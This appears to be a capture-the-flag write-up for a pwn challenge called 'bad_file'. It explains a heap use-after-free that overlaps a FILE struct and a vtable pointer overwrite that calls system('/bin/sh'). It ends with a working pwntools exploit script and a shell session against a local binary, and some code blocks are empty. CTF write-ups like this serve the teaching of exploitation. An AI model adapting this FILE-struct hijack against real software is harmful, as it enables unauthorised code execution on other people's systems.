# bad_file

This writeup goes out to my friend and the person who made this challenge, the man, the myth, the legend himself, noopnoop.

Let's take a look at the binary and libc file:
```

```

So we can see that we are dealing with a 64 bit binary without RELRO or PIE. When we run the binary it prompts us for several inputs before crashing.

### Reversing

When we take a look at the Ghidra disassembly, we see this:
```

void main(void)

{
  void *ptr;
  FILE *stream;
  char input0 [16];
  char input1 [40];
 
  ptr = malloc(0x250);
  setbuf(stdout,(char *)0x0);
  puts("Would you like a (1) temporary name or a (2) permanent name?");
  read(0,input0,2);
  if (input0[0] == '1') {
    temp_name(ptr);
  }
  else {
    perm_name(ptr);
  }
  stream = fopen("/dev/null","rw");
  puts("I created a void for you, and this can let you practice some sorcery");
  puts("You\'re in danger, you\'ll need a new name.");
  read(0,ptr,0x160);
  puts("Now let\'s send some magic to the void!!");
  fread(input1,1,8,stream);
  puts(input1);
  puts("I hope the spell worked!");
                    /* WARNING: Subroutine does not return */
  exit(0);
}
```

So we see it starts off my allocating the `0x250` byte chunk `ptr` with malloc. Proceeding that it prompts us for input. If we input a `1` it runs the `temp_name` function with the argument `ptr`. If we input anything else it runs `perm_name` with the argument `ptr`. After that it opens up the file `/dev/null`. Proceeding that we are able to scan `0x160` bytes into the space pointed to by `ptr`. After that it scans in 8 bytes of data from the file object which should be `/dev/null` into the char buffer `input1`. Following that it prints the contents of `input1`. Let's take a look at the `perm_name` and `temp_name` functions:

```
void temp_name(char *input)

{
  gets(input);
  printf("Hello, %s (for now)\n",input);
  free(input);
  return;
}
```

```
void perm_name(char *input)

{
  gets(input);
  printf("Hello, %s!\n");
  return;
}
```

These functions are pretty similar. They both scan in input to the heap pointer `ptr` with `gets` (which will allow us to overflow it), and then prints the contents of `ptr`. The difference is `temp_name` frees the heap pointer after printing it's contents, which we can then scan data into later. This is a use after free bug.

### Exploiting

So we have a heap overflow bug with gets, and a use after free. For the heap overflow bug I initially wanted to see if I could overflow the buffer right up to an address and then leak it with the printf call. However there was one problem with that:

```

0x602250: 0x0 0x0
0x602260: 0x0 0x20da1
```

Here is a look at the memory region of `ptr` which points to `0x602010` (and a bit past where it ends). The issue is other than the top chunk (`0x20da1` specifies how much space is left unallocated in the heap) there is nothing but zeroes in are of the heap our overflow can reach. That coupled with the fact the only thing left that happens to the heap in terms of allocating/freeing memory is a single free to `ptr`, we can't use this bug for anything other than a DOS.

So that just leaves us with the use after free. However when we look into that, we see something interesting:

```

We can see that the `fopen` call returns the heap pointer `0x602010`, which is where it stores information regarding the file. We can see with the `read` call (or really anywhere in the main function), that it overlaps directly with `ptr`:

```

```

Here we can see both where `ptr` belongs in the stack, and the argument for the read call is `0x602010` which is the same pointer for the file struct. This happened because malloc will reuse previously freed memory chunks for performance reasons (if the memory sizes are correct, which in this case they are). As a result we can directly overwrite the file struct.

This is my first time dealing with a file struct exploit. At first I tried reversing the `fopen` and `fread` functions to figure out if there was a way I could somehow change which file it would read from (or really change anything that would benefit us). After a bit I tried changing various of the file struct, which is when I found something interesting. Here is the file struct after it has been allocated:

```

0x602150: 0x0000000000000000  0x0000000000000000
0x602160: 0x0000000000000000  0x0000000000000000
```

Here is everything we can reach with out overflow (`0x160 / 8 = 44`). When `fread` is called, there is a function `_IO_sgetn` that is called on our input:

```
gef➤  disas _IO_sgetn
Dump of assembler code for function __GI__IO_sgetn:
   0x00007ffff7a88700 <+0>: mov    rax,QWORD PTR [rdi+0xd8]
   0x00007ffff7a88707 <+7>: mov    rax,QWORD PTR [rax+0x40]
   0x00007ffff7a8870b <+11>:  jmp    rax
End of assembler dump.
```

In this case the register `rdi` holds a pointer to the file struct. Here it dereferences `rdi+0xd8` (which in our case would be the value stored at `0x6020e8` which is `0x00007ffff7dd06e0`). Then the instruction pointer stored at that address `+0x40` is then moved into the `rax` register, and then executed via a jump (in our case `0x00007ffff7dd06e0 + 0x40 = 0x7ffff7dd0720`). We can see that the function which should be executed is `_IO_file_jumps`:

```
gef➤  x/i 0x00007ffff7dd06e0
   0x7ffff7dd06e0 <_IO_file_jumps>: add    BYTE PTR [rax],al
```

So we can see that we can overwrite a pointer which is dereferenced to get an instruction pointer, and then executed. We will use this to get code execution. However the pointer is at offset `0xd8`, so we have to overwrite several different pointers which could cause issues. To figure this out I just overwrote the values of pointers one by one to see if they would cause us issues. Turns out only one of them do cause issues, and it's nothing major. It's the pointer stored at offset `0xa0` (it's `0x602100` at `0x6020b0`):

```

Here we can see that the value we overwrote at offset `0xa0` to be `0x400000` is causing a crash (the reason why it is an address, is because earlier that value is dereferenced, so if it isn't an address it would cause a crash). Here it is running the `cmpxchg` instruction which compares the two operands, and if they aren't equal the contents of the second argument are moved into the first. The issue here is that the memory region `0x400000` is in is not writeable, so it crashes when it tries to write to it. To solve this I just looked through the memory region starting at `0x601000` for an eight byte segment that was equal to `0x0` (since without our hacking that's what the value is). Since there isn't `pie` I know the address before the binary runs, and since the region is writeable I can write to it no problem.

So with that, it just leaves us with our final problem. What value will we overwrite the pointer to an instruction pointer with to get code execution. There is a `hidden_alleyway` function which would print the flag, however due to the lack of infoleaks I couldn't find a way to get a pointer to it's address. Luckily for us the GOT table has system in it. So to get a shell I just overwrote the pointer at offset `0xd8` with the got address of `system - 0x40` (we need the `-0x40` to counter the `+0x40`). Then when it dereferences that pointer, and jumps to an instruction pointer it will call system.

The last thing we need is to pass the argument `/bin/sh` to the function `system` (which takes a char pointer as an argument). Luckily for us the first argument is passed in the `rdi` register, which at the time of the jump is a pointer to the freed `heapPtr` (and due to the overlap, `stream` too). So we just have to set the first eight bytes of our input equal to `/bin/sh\x00` (we need the null byte in there to separate it from the rest of the input) to pass the argument `/bin/sh` to system.

### Exploit Code

With all of this, we can write the exploit (ran on Ubuntu 16.04):

```
from pwn import *

# Establish the target
target = process('./bad_file', env={"LD_PRELOAD":"./libc6.so"})
#gdb.attach(target)

# Get through the initial prompt and temp_name functions
# Make sure to go the UAF route
target.sendline("1")
target.sendline("15935728")

# Make the payload
payload = "/bin/sh\x00"
payload += "0"*0x80
payload += p64(0x6010b0)
payload += "1"*0x48
payload += p64(0x601038 - 0x40)

# Wait for it to prompt us for a new name
print target.recvuntil("new name.")

# Send the exploit
target.send(payload)

# Drop to an interactive shell to use the shell
target.interactive()
```

When we run it:

```
$	python exploit.py 
[+] Starting local process './bad_file': pid 3242
Would you like a (1) temporary name or a (2) permanent name?
Hello, 15935728 (for now)
I created a void for you, and this can let you practice some sorcery
You're in danger, you'll need a new name.
[*] Switching to interactive mode

Now let's send some magic to the void!!
$ w
 17:38:08 up 18 min,  1 user,  load average: 0.10, 0.03, 0.02
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
guyinatu tty7     :0               17:19   18:39   3.12s  0.15s /sbin/upstart --user
$ ls
bad_file  core    exploit.py  libc6.so  readme.md

```

Just like that we captured the flag!
